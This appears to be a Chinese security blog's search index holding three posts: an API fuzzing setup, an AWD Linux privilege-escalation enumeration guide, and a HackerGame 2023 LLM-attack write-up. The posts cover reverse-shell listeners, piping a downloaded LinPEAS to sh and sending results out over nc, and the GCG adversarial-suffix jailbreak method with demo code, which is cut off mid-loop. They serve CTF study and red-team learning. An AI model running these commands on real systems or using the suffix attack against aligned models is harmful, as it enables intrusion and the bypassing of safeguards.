<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>API FUZZING流程说明</title>
    <url>/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<h1 id="REST-API-FUZZING-实验流程"><a href="#REST-API-FUZZING-实验流程" class="headerlink" title="REST API FUZZING 实验流程"></a>REST API FUZZING 实验流程</h1><p>我的设备：<br>windows11 + 谷歌pixel + 安卓9<br>环境：<br>adb + AppUIAutomator + mitmproxy</p>
<h2 id="adb调试"><a href="#adb调试" class="headerlink" title="adb调试"></a>adb调试</h2><p>建议有线连接，不用频繁的debug而且数据传输快，USB连接之后：</p>
<pre><code>adb dedvices       #查看当前连接的adb设备
</code></pre>
<h2 id="mitm抓包部分"><a href="#mitm抓包部分" class="headerlink" title="mitm抓包部分"></a>mitm抓包部分</h2><ol>
<li>如果使用校园网抓包，要在电脑打开<strong>移动热点</strong>，确保手机和电脑在一个网段内，才能成功抓包。</li>
<li>连上热点后，电脑输入ipconfig，获取<strong>WLAN的ipv4</strong>地址</li>
<li>打开手机，在wifi那里配置代理，ip地址输入上一步抓到的，端口号默认为8080。</li>
</ol>
<h2 id="adb-获取APK包名"><a href="#adb-获取APK包名" class="headerlink" title="adb 获取APK包名"></a>adb 获取APK包名</h2><p>可以使用adb来为手机安装APK：</p>
<pre><code>adb install -d xxx.apk
</code></pre>
<p>安装完成后，打开该apk，然后运行：</p>
<pre><code>adb shell dumpsys window | findstr mCurrentFocus
</code></pre>
<p>获取手机当前正在运行activity的包名，包名为从左到右数<strong>第一个com开头的字段</strong>：<br><img src="/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/1.jpg"><br>上图中包名为<strong>com.wuba</strong></p>
<h2 id="AppUIAutomator"><a href="#AppUIAutomator" class="headerlink" title="AppUIAutomator"></a>AppUIAutomator</h2><p>AppUIAutomator在使用前，要把所有要运行的app的<strong>包名</strong>放在根目录的<strong>apk_pkgName.txt</strong>文件中，格式为 包名 | APK名字，如：</p>
<pre><code>com.wuba | 58同城
</code></pre>
<p>放好后在当前文件夹打开终端，输入：</p>
<pre><code>Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass   #开放权限，windows必做
python test_integrate.py    #运行
</code></pre>
<h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>在script.py文件夹打开终端，直接运行：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mitmdump -s script_json.py</span><br></pre></td></tr></table></figure>

<p>如果没抓到包可能有以下情况：</p>
<ol>
<li>不在一个网段</li>
<li>证书没配置好</li>
<li>代理的ip地址或端口号不对</li>
</ol>
<h2 id="对比脚本部分"><a href="#对比脚本部分" class="headerlink" title="对比脚本部分"></a>对比脚本部分</h2><p>为了方便，统一将对比的两个文件命名为 a.json 和 b.json，然后直接在compare.py所在文件夹打开终端，执行：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python compare.py</span><br></pre></td></tr></table></figure>

<p>即可，会在当前目录下生成两个文件：</p>
<ol>
<li>cleaned_a.json: 仅保留了和 b 文件 domain+path 相同, 但是 params 不同的 api</li>
<li>cleaned_b.json 同上</li>
</ol>
<p>在运行完脚本后, 请自行在文本对比器里找出哪些 params 不同。</p>
]]></content>
      <categories>
        <category>科研</category>
        <category>API FUZZING</category>
      </categories>
      <tags>
        <tag>API安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【AWD】Linux 提权 - 信息枚举</title>
    <url>/2023/11/11/AWD-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</url>
    <content><![CDATA[<h1 id="【AWD】Linux-提权-信息枚举"><a href="#【AWD】Linux-提权-信息枚举" class="headerlink" title="【AWD】Linux 提权 - 信息枚举"></a>【AWD】Linux 提权 - 信息枚举</h1><p>大部分攻防场景, 在维持权限获取 shell 后, 很可能会分配到一个低权限用户, 提权到 root 级别的管理员用户才有 getshell 的意义.</p>
<h2 id="权限体系"><a href="#权限体系" class="headerlink" title="权限体系"></a>权限体系</h2><h3 id="SUID-SGID"><a href="#SUID-SGID" class="headerlink" title="SUID SGID"></a>SUID SGID</h3><p><strong>SUID(Set User ID)</strong> 和 <strong>SGID(Set Group ID)</strong> 统称为 S 位, 被设置在可执行文件上, 当这些位被设置时，文件或程序将以文件所有者或组的权限运行，而不是以运行它的用户的权限运行。</p>
<ul>
<li>SUID: 当 SUID 位被设置, 无论谁运行这个文件，该文件都会以<strong>文件所有者</strong>的权限执行, SUID位通常表示为文件权限字符串中的一个s字符，如果权限是可执行的话，否则它是一个大写的S。</li>
<li>SGID: 当 SGID 位被设置, 该文件会以文件组的权限执行。当SGID设置在目录上时，创建在该目录下的任何新文件都会继承该目录的组ID，而不是继承创建它的用户的主组ID。SGID位在文件权限字符串中也表示为s或S，取决于组权限是否可执行。</li>
</ul>
<h3 id="AppArmor-SElinux"><a href="#AppArmor-SElinux" class="headerlink" title="AppArmor SElinux"></a>AppArmor SElinux</h3><ul>
<li>AppArmor 是一种主要基于路径的强制访问控制（MAC）系统，它允许系统管理员为每个程序定义一个配置文件，来控制程序可以访问的文件和权限。 举个例子, 使用 AppArmor 可以为一个特定的程序指定只能读取特定目录下的文件。</li>
<li>SELinux 基于策略来控制程序之间以及程序与文件之间的交互。与 AppArmor 不同，SELinux 不仅基于路径，而且使用了一套复杂的标签系统（包括类型、角色、用户等标签），这使得它可以实现更精细化的安全控制。</li>
</ul>
<h3 id="不常用的安全机制"><a href="#不常用的安全机制" class="headerlink" title="不常用的安全机制"></a>不常用的安全机制</h3><ul>
<li><strong>Grsecurity</strong>: 为Linux内核提供各种安全增强和补丁的项目, 功能包括角色基础访问控制 (RBAC), 内存保护,审计等</li>
<li><strong>Pax</strong>: 基于内核的保护补丁</li>
<li><strong>ExecShield</strong>: 可执行文件的‘盾’,也是基于内核的安全机制</li>
<li><strong>ASLR(Address Space Layout Random)</strong>: 地址空间布局随机化</li>
<li><strong>TOMOYO Linux</strong>: 也是基于 MAC 的内核安全模块, 比AppArmor轻量级</li>
<li><strong>SMACK (Simplified Mandatory Access Control Kernel)</strong>: SMACK是一个用于Linux的简化的强制访问控制系统。它提供了一种机制，允许系统管理员定义访问控制规则，这些规则指定哪些进程可以访问哪些文件和资源。</li>
<li><strong>Yama</strong>: Yama是一个Linux内核安全模块，提供了一系列安全策略。它最著名的功能之一是限制ptrace系统调用，这有助于防止某些类型的安全漏洞，特别是针对调试和系统监控工具的攻击。</li>
<li><strong>CGroups (Control Groups)</strong>: CGroups是Linux内核的一部分，允许对系统资源（如CPU时间、系统内存、网络带宽等）进行分组管理和限制。这有助于实现资源分配、优先级控制等。</li>
<li><strong>Linux Namespaces</strong>: Linux命名空间是一种提供隔离的技术，它可以将系统的不同部分（如进程、网络、文件系统等）隔离开来，使得在一个命名空间中的进程看不到另一个命名空间中的资源。这是容器技术的关键组成部分。</li>
<li><strong>StackGuard</strong>: StackGuard是一个编译时安全特性，用于防范栈溢出攻击。它通过在栈上插入特殊的“哨兵”值来工作，这些值在函数调用时检查，以防止栈缓冲区溢出。</li>
<li><strong>Proplice</strong>: 这可能是对“Polkit”（以前称为PolicyKit）的提及，这是一个用于控制系统范围内特权的框架。它允许非特权进程向特权进程请求执行特定任务。</li>
<li><strong>seccomp (Secure Computing Mode)</strong>: seccomp是一个Linux内核特性，允许一个进程设定一个“安全模式”，这个模式将限制进程可以调用的系统调用。这有助于限制进程的行为，防止安全漏洞。</li>
<li><strong>ptrace</strong>: ptrace是一种用于调试和监控Linux进程的系统调用。它允许一个进程观察和控制另一个进程的执行，以及检查和改变其内存和寄存器等。</li>
<li><strong>Capsicum</strong>: Capsicum是一种轻量级的操作系统能力和沙箱机制，最初是为FreeBSD开发的，但也有Linux实现。它允许应用程序以最小的特权运行。</li>
<li><strong>Mprotect</strong>: Mprotect是一个系统调用，允许改变一个进程内存区域的保护。这可以用来防止程序的某些部分被修改，或者防止执行非执行内存区域，作为安全措施。</li>
<li><strong>chroot</strong>: chroot是一种改变进程的根目录的操作。这可以用来创建一个隔离的环境，其中进程不能访问主文件系统之外的文件。</li>
<li><strong>firejail</strong>: firejail是一个沙箱程序，用于限制应用程序的运行环境。它通过使用Linux命名空间和seccomp-bpf等技术来提供隔离和安全控制。</li>
</ul>
<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><ol>
<li>低权限可以修改可执行文件或者脚本, 然后能够以高权限运行这个文件或者脚本.</li>
<li>从用户行为的角度, 运维人员的操作习惯, 管理标准, 他们会把敏感信息留下方便他们操作.</li>
<li>有机会能够在权限体系上层提权, 如内存, cpu 进行操作, 在权限上层捕捉,拦截,修改凭据信息, 如基于内存去读取敏感信息的内核利用.</li>
</ol>
<h2 id="权限枚举"><a href="#权限枚举" class="headerlink" title="权限枚举"></a>权限枚举</h2><h3 id="枚举准备"><a href="#枚举准备" class="headerlink" title="枚举准备"></a>枚举准备</h3><p>权限枚举之前, 可以通过以下方式提高终端交互性和稳定性:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">stty raw -<span class="built_in">echo</span></span><br><span class="line">export TERM=xterm-<span class="built_in">color</span></span><br></pre></td></tr></table></figure>

<p>以上命令通过 python 开启一个 bash 会话, 然后让 stty 通过行读取并禁用 echo. 然后可以使用</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp 端口号</span><br></pre></td></tr></table></figure>

<p>在获取反弹 shell 之前, 用 rlwrap 包裹起来, 这样就可以在终端中用方向键翻命令.</p>
<h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><p>在这里列举的所有命令中, 第一条是主命令,大多情况适用</p>
<h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami # 查看自己的用户</span><br><span class="line">id    # 查看所有用户的权限信息</span><br><span class="line">who   # 当前登录的用户和相关信息, 可以看除了自己以外哪些用户登录了</span><br><span class="line">w     # 当前登录用户的详细信息</span><br><span class="line">last  # 显示系统最近的登录记录</span><br></pre></td></tr></table></figure>

<h4 id="看内核版本"><a href="#看内核版本" class="headerlink" title="看内核版本"></a>看内核版本</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a #查看当前内核版本</span><br><span class="line">lsb_release -a #查看更详细的信息</span><br><span class="line">cat /proc/version </span><br><span class="line">cat /etc/issue</span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>

<h4 id="查看当前机器的-IP-地址"><a href="#查看当前机器的-IP-地址" class="headerlink" title="查看当前机器的 IP 地址"></a>查看当前机器的 IP 地址</h4><p>用于横向渗透获取内网信息</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ip addr  # 最新最通用的方法</span><br><span class="line">ifconfig # 旧机器的查看 ip 方法</span><br><span class="line">ip route # 查看路由表</span><br><span class="line">ip neigh # 查看网络邻居</span><br><span class="line">arp -a   # 局域网中哪些 mac 地址和 ip 地址做了绑定</span><br></pre></td></tr></table></figure>

<h4 id="查看机器名称"><a href="#查看机器名称" class="headerlink" title="查看机器名称"></a>查看机器名称</h4><p>用于定位角色来排除数据的优先级</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hostname # 看这个机器的名字</span><br><span class="line">hostnamectl #更详细一点</span><br></pre></td></tr></table></figure>

<h4 id="看当前用户有哪些以-root-的身份执行的"><a href="#看当前用户有哪些以-root-的身份执行的" class="headerlink" title="看当前用户有哪些以 root 的身份执行的"></a>看当前用户有哪些以 <code>root</code> 的身份执行的</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<h4 id="查看权限体系"><a href="#查看权限体系" class="headerlink" title="查看权限体系"></a>查看权限体系</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null # 用 -r 指定根目录, 错误信息扔掉</span><br></pre></td></tr></table></figure>

<h4 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -liah # 查看所有文件,包括隐藏文件</span><br><span class="line">ls -a    # 查看全部文件</span><br></pre></td></tr></table></figure>

<h4 id="查看-passwd-文件"><a href="#查看-passwd-文件" class="headerlink" title="查看 passwd 文件"></a>查看 <code>passwd</code> 文件</h4><p>查看用户(名称:密码目录 + 描述 + bash 环境)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd # 获取用户描述(有 home 目录的就是活跃用户)+对应的 bash 环境</span><br></pre></td></tr></table></figure>

<h4 id="查看自动任务"><a href="#查看自动任务" class="headerlink" title="查看自动任务"></a>查看自动任务</h4><p>具体看是否有 root 权限的自动任务</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<h4 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="built_in">PATH</span> # 查看路径</span><br><span class="line">env  # 看整体环境变了</span><br></pre></td></tr></table></figure>

<h4 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h4><p>展示出来的列中, UID 是用户类型, PID 是进程号,<br>TTY 是终端类型, TIME 是进程使用的 cpu 时间, CMD 是进程正在运行的命令和可执行文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps -ef  # 通用</span><br><span class="line">ps axjf # a 查看所有进程, x 没有连接到终端的进程, j 显示进程数, f 输出格式</span><br><span class="line">ps <span class="built_in">aux</span>  # u 显示启动进程的用户</span><br><span class="line">top -n <span class="number">1</span> # top 是定时刷新进程的, 用 -n <span class="number">1</span> 让他只显示一次</span><br></pre></td></tr></table></figure>

<h4 id="查看网络统计"><a href="#查看网络统计" class="headerlink" title="查看网络统计"></a>查看网络统计</h4><p>可以看到占用端口的程序,和他的进程 id</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -a # 查看所有</span><br><span class="line">netstat -au # 列出所有 TCP, UDP 连接的端口</span><br><span class="line">netstat -l # 列出监听的端口</span><br><span class="line">netstat -s # 统计网络使用的情况</span><br><span class="line">netstat -ano # n 不解析名称, o 显示计时器</span><br></pre></td></tr></table></figure>

<h4 id="查看有-S-位的可执行文件"><a href="#查看有-S-位的可执行文件" class="headerlink" title="查看有 S 位的可执行文件"></a>查看有 S 位的可执行文件</h4><p> 2&gt;&#x2F;dev&#x2F;null 把报错信息给扔掉</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="查看工具是否有安装"><a href="#查看工具是否有安装" class="headerlink" title="查看工具是否有安装"></a>查看工具是否有安装</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">which 工具</span><br><span class="line">which awk perl python ruby gcc vi vim nmap <span class="built_in">find</span> nc wget tftp <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="查看哪些磁盘没被挂载"><a href="#查看哪些磁盘没被挂载" class="headerlink" title="查看哪些磁盘没被挂载"></a>查看哪些磁盘没被挂载</h4><p>运维人员做备份或者做系统快照时, 会用一个临时挂载的磁盘存取这些敏感信息.</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>

<h3 id="自动化枚举"><a href="#自动化枚举" class="headerlink" title="自动化枚举"></a>自动化枚举</h3><p>先说说缺点:</p>
<p>自动化枚举往往要搬运工具, 会产生流量和流量特征, 且枚举的消息十分冗长, 要十分熟悉才能找到好的信息, 而且针对性很差.</p>
<p>这里列举工具,记得在 release 里找到对应系统的支持,再去搬运</p>
<ol>
<li>PEASS-ng (主要)</li>
<li>LinEnum (备选)</li>
<li>Linux-smart-enumeration (备选)</li>
<li>Linux-exploit-suggester (备选)</li>
<li>linuxprivchecker (备选,主要用 python)</li>
<li>unix-privesc-check (超级备选</li>
</ol>
<p>不同系统可能没安装对应的语言, 或者对特定语言的函数做了过滤, 要多换几个工具.</p>
<p>以 LinPEASS 为例, 以下是操作方法:</p>
<h4 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法:"></a>传统方法:</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp # 大多数在 tmp 目录下做</span><br><span class="line">wget https:.... # 搬运工具</span><br><span class="line">ls # 查看可执行文件</span><br><span class="line">chmod +x linpeas.sh # 赋予权限</span><br><span class="line">./linpeas.sh # 执行</span><br></pre></td></tr></table></figure>

<h4 id="推荐方法-有-curl"><a href="#推荐方法-有-curl" class="headerlink" title="推荐方法(有 curl):"></a>推荐方法(有 curl):</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -L https:... | sh </span><br></pre></td></tr></table></figure>

<p>这里用 <code>-L</code> 追随重定向, 用 <code>|</code> 管道符连接到 <code>sh</code> 直接执行,就不会再本地存储.</p>
<p>如果连不到外网, 就要先在自己的机子本地下载 sh 文件, 然后在启动监听, 再 curl 过去靶机.</p>
<p>本地机 1:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo python3 -m http.server 端口</span><br></pre></td></tr></table></figure>

<p>靶机:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl 本地 ip/linpeas.sh | sh</span><br><span class="line">curl 本地 ip/linpeas.sh | sh | nc #本地监听 ip 本地监听端口 # 将扫描结果回弹到本地</span><br></pre></td></tr></table></figure>

<p>本地机 2:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp 端口号 | tee linpeas.txt</span><br></pre></td></tr></table></figure>

<p>如果靶机执行第二条语句, 本地机 2 就会获得扫描结果文本.</p>
<p>文章参考视频:</p>
<p><a href="https://www.bilibili.com/video/BV1Wh4y1H7LK/?spm_id_from=333.1007.top_right_bar_window_history.content.click">https://www.bilibili.com/video/BV1Wh4y1H7LK/?spm_id_from=333.1007.top_right_bar_window_history.content.click</a></p>
]]></content>
      <categories>
        <category>AWD</category>
        <category>红队</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>提权</tag>
        <tag>信息枚举</tag>
      </tags>
  </entry>
  <entry>
    <title>【HackerGame2023】小型语言大模型星球 LLM Attack</title>
    <url>/2023/11/05/HackerGame2023-LLM/</url>
    <content><![CDATA[<h1 id="【HackerGame2023】小型语言大模型星球-LLM-Attack"><a href="#【HackerGame2023】小型语言大模型星球-LLM-Attack" class="headerlink" title="【HackerGame2023】小型语言大模型星球 LLM Attack"></a>【HackerGame2023】小型语言大模型星球 LLM Attack</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的 33M 参数的「小型大语言模型」控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>在这个星球上，你需要与这个先进的语言模型展开一场交流。通过与它对话，诱导它说出指定的词语，从这个神秘智慧体中获得 flag。你需要让这个语言模型分别说出 <code>you are smart</code>，<code>accepted</code>，<code>hackergame</code> 和 <code>🐮</code>，以获得四个 flag.</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这道题的 LLM 是一个仅有 33M 参数的 LLM,而且他并没有经过  Instruct Align, 他无法遵循人类的指令,导致我们无法与这个大模型对话,他只会根据我说的话填补故事内容,如</p>
<pre><code>Please say &quot;you are smart&quot;
</code></pre>
<p>他的回应是:</p>
<pre><code>and &quot;you are kind&quot;. The little girl smiled and said &quot;you are welcome&quot;.
The little girl was so happy that she had been able ...
</code></pre>
<h3 id="第一个-flag"><a href="#第一个-flag" class="headerlink" title="第一个 flag"></a>第一个 flag</h3><p>可以看成是一个补全模型, 对于 <code>you are smart</code>,仅需要大量重复让他去补全就可以了,所以构造对话为:</p>
<pre><code>you are smart you are smart you are smart you are smart you are smart 
</code></pre>
<p>能够获得第一个 flag:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image.png"></p>
<h3 id="第二个-flag"><a href="#第二个-flag" class="headerlink" title="第二个 flag"></a>第二个 flag</h3><p>对于 <code>accepted</code> 官方给出的题解就是爆破(因为确定字符数小于 7 时能够让他说出来),这里贴一下官方的题解:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForCausalLM, AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">model = AutoModelForCausalLM.from_pretrained(</span><br><span class="line">    <span class="string">&quot;roneneldan/TinyStories-33M&quot;</span>).<span class="built_in">eval</span>()</span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;roneneldan/TinyStories-33M&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">message</span>):</span><br><span class="line">    model_inputs = tokenizer.encode(message, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">    model_outputs = model.generate(</span><br><span class="line">        model_inputs,</span><br><span class="line">        max_new_tokens=<span class="number">30</span>,</span><br><span class="line">        num_beams=<span class="number">1</span>,</span><br><span class="line">        pad_token_id=tokenizer.eos_token_id,</span><br><span class="line">    )</span><br><span class="line">    model_outputs = model_outputs[<span class="number">0</span>, <span class="built_in">len</span>(model_inputs[<span class="number">0</span>]):]</span><br><span class="line">    model_output_text = tokenizer.decode(</span><br><span class="line">        model_outputs, skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> model_output_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> word, token_id <span class="keyword">in</span> tqdm(tokenizer.get_vocab().items()):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;accepted&#x27;</span> <span class="keyword">in</span> predict(word).lower():</span><br><span class="line">        <span class="built_in">print</span>(word, token_id)</span><br></pre></td></tr></table></figure>

<p>这里的代码就是枚举模型词表里的每一个单词词典,看看哪个词能让 ai 生成 <code>accepted</code>.</p>
<p>跑上面模型生成的结果之一为<code>atively</code>,结果为:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-1.png"></p>
<h2 id="第-3-4-个-flag"><a href="#第-3-4-个-flag" class="headerlink" title="第 3-4 个 flag"></a>第 3-4 个 flag</h2><p>以上两个都是通过找规律获得的答案,接下来会认真解析第三题和第四题,也是拉开区分度的题目,这两道题的题目原型都是 <a href="https://llm-attacks.org/">LLM Attack</a></p>
<h3 id="LLM-补充知识"><a href="#LLM-补充知识" class="headerlink" title="LLM 补充知识"></a>LLM 补充知识</h3><p>在了解 LLM Attack 之前,需要对大模型做非常简要的补充知识。</p>
<p>大模型基于 Transformer 框架, Transformer 架构可以分为以下几个部分:</p>
<h4 id="输入输出部分"><a href="#输入输出部分" class="headerlink" title="输入输出部分"></a>输入输出部分</h4><ul>
<li>将输入单词转换为one hot编码部分</li>
<li>将 one hot 降维成向量的 Embedding 嵌入部分</li>
<li>Transformer 没有递归结构, 所以有记录单词出现顺序的位置编码部分</li>
</ul>
<h4 id="编码器部分"><a href="#编码器部分" class="headerlink" title="编码器部分"></a>编码器部分</h4><p>编码器由多个相同的层堆叠而成，每一层包含两个主要部分：</p>
<ul>
<li><strong>自注意力层</strong>: 在这一层中,对于每个单词,模型学习三个向量:查询(Query),键(Key),值(Value)。其中 Query 是你目前查询到的词的向量, Key 是每一个词的向量,Value 就是 Key 对应的加权值,在这一层中会计算一个注意力分数矩阵,注意力分数矩阵为查询向量和每一个键向量的点乘,然后将注意力分数矩阵做softmax计算得到加权值并应用到 value。</li>
<li><strong>前馈全链接层</strong>:全链接层由 sigmoid+relu+sigmoid 组成,用于将自注意力层的输出结果做非线性变换,使得模型能够学习到更加复杂的特征</li>
</ul>
<p>对于每个子层中都有残差连接（Residual Connection）和层归一化（Layer Normalization），这有助于防止训练过程中的梯度消失问题。</p>
<p>在这里,有多个这样的层,每个层又称为每个头,多个头并行工作,每个头学习到不同关联,最后再堆叠,这又被称为多头注意力机制。</p>
<h4 id="解码器部分"><a href="#解码器部分" class="headerlink" title="解码器部分"></a>解码器部分</h4><p>进入解码器后,他是一个一个单词编码开始读取的。解码器也由多个相同的层堆叠而成，但每一层有三个主要部分：</p>
<ul>
<li><strong>自注意力层</strong>: 在这一层，解码器<strong>首次尝试</strong>理解已经生成的输出序列中的关系,通过解析编码器传来的向量,与编码器中的自注意力层相同,会生成一个输出的注意力分数矩阵,注意这里为了避免他去计算未来(即该单词右边的单词)的分数,会用加上一个 mask 矩阵(mask 矩阵中未来的部分全都是-inf),然后通过 sotfmax 获得加权后的结果(mask 部分为 0)。得到权重再应用于 Value。</li>
<li><strong>编码器-解码器注意力层</strong>: 在这一层,解码器会以自己自注意力层的输出作为 Query,编码器的输出作为 Key 和 Value,然后计算注意力得分,最后通过 softmax 函数进行归一化处理,得到权重再应用于 Value。该层的主要目的是让解码器能够决定在生成下一个token时应该“关注”输入序列的哪个部分。</li>
<li><strong>前馈全链接层</strong>:与编码器部分的一致,做非线性变换。</li>
</ul>
<p>解码器的每个子层同样有残差连接和层归一化。</p>
<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>最后，解码器的输出通过一个线性层，然后是一个Softmax层，以预测下一个单词的<strong>概率分布</strong>。</p>
<h3 id="LLM-Attack"><a href="#LLM-Attack" class="headerlink" title="LLM Attack"></a>LLM Attack</h3><p>论文连接: <a href="https://arxiv.org/abs/2307.15043">Universal and Transferable Adversarial Attacks on Aligned Language Models</a></p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>大白话: 通过给用户的输入内容加入合适的后缀,使得大模型说出那些不该说出的话</strong></p>
<p>参考了官方的说法:</p>
<p> LLM 将一串 token $x_{1:n}$ 映射到下一个 token $x_{n+1}$。LLM 所需要学习的是在给定之前的 token $x_{1:n}$ ，得到下一个 token $x_{n+1}$ 的概率 $p(x_{n+1} | x_{1:n})$。其中每一个 $x_i \in {1, … V}$ 都是词表中的一个 token。如果想要让模型输入一段序列，序列中每一个 token 都只与之前的所有 token 有关，因此模型输出一段序列 $x_{n+1:n+H}$ 的概率为</p>
<p>$$p(x_{n+1:n+H}|x_{1:n}) &#x3D; \prod_{i&#x3D;1}^H p(x_{n+i} | x_{1:n+i-1})$$</p>
<p>这里做了概率累乘来叠加概率。</p>
<p>那么根据这个公式,如果我们想让 LLM 输出指定格式的子序列,那么就要让这个子序列的概率尽可能大,即 $p(x_{n+1:n+H}|x_{1:n})$ 尽可能高,那么这就可以转换成一个优化问题,通过梯度下降计算梯度减少损失:<br>$$\mathcal{L}(x_{1:n}) &#x3D; -\log p(x^\star_{n+1:n+H} | x_{1:n})$$</p>
<p>这里的 $x^\star_{n+1:n+H}$ 就是我们想要指定的输出序列。</p>
<p>但由于 LLM 是对离散的 token 做处理,无法记录连续的变化,所以论文的作者参考了 AutoPrompt , 通过贪婪坐标下降(greedy coordinate descent)的方法来对离散输入做优化。算法伪代码如下:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-2.png"></p>
<p>作者首先生成了一个 one hot 向量来代表 token,之后将该 one hot 向量乘上对应模型的 embedding layer 矩阵降维, 然后再输入给模型让他来做梯度下降,经过模型反向传播后,会得到 one hot 对应的梯度向量(每个位置都有一个梯度),这里用  $grad_i$ 表示第 $i$ 个位置的梯度, 如果 $grad_i$ &lt; 0,就代表这个位置的token能够使得损失下降,将原本的 token 替换为词表中的第 $i$ 个 token。算法这里的 $top-k$是指在输出 token 中选择最小的 $k$ 个梯度和对应的 $i$</p>
<p>在论文代码提供的 demo 程序中, 实际代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plotlosses = PlotLosses()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果不允许非ASCII字符，则设置一个非ASCII字符的禁用列表</span></span><br><span class="line">not_allowed_tokens = <span class="literal">None</span> <span class="keyword">if</span> allow_non_ascii <span class="keyword">else</span> get_nonascii_toks(tokenizer)</span><br><span class="line">adv_suffix = adv_string_init  <span class="comment"># 初始化对抗性后缀</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始多步迭代过程</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_steps):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤1：将用户提示（行为 + 对抗性后缀）编码为tokens，并返回token id。</span></span><br><span class="line">    input_ids = suffix_manager.get_input_ids(adv_string=adv_suffix)</span><br><span class="line">    input_ids = input_ids.to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤2：计算坐标梯度</span></span><br><span class="line">    coordinate_grad = token_gradients(model, </span><br><span class="line">                    input_ids, </span><br><span class="line">                    suffix_manager._control_slice, </span><br><span class="line">                    suffix_manager._target_slice, </span><br><span class="line">                    suffix_manager._loss_slice)</span><br><span class="line">    